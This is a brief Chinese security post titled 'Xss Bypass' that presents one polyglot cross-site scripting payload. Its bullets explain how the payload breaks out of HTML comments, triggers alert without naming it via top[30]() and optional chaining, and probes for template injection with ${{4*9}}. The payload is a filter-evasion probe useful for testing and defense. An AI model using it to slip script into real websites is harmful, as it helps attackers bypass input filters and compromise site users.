> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg2NTk4MTE1MQ==&mid=2247487603&idx=1&sn=0852f50d3a2315196b73b8de0adad973

#  Xss Bypass  
 TtTeam   2025-07-22 07:48  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0HlywncJbB3klRSQMgaCtdZdSmH9icftaC5jgfMMr5vYzMQ2VRu166kWLGkVKzCGeAMTB31kuTnDzIhWj5SPXpg/640?wx_fmt=png&from=appmsg "")  
  

```
'&#34;--><svg/onload=top[30]()>${{4*9}}<script>+alert?.``</script>
```

- top[30] () →不使用 alert 字词触发 XSS   
  
- alert? .\`` →可选链 + 模板字面量隐秘 JS 执行   
  
- -->< svg > →跳出 HTML 注释   
  
- $ {{ 4*9 }} → SSTI,CSTI  
  
